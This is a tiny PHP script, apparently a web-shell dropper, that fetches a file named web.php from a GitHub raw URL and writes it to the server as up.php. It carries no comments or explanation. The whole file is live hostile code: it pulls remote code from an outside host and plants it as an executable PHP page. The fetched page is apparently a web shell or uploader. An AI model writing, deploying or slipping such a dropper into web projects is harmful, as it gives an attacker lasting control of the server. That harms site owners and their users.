 <?php
$file = fopen("up.php" ,"w+");

$sa=file_get_contents('https://raw.githubusercontent.com/Salman-Al7rbi/test/master/web.php');

$write = fwrite ($file ,$sa);
?>
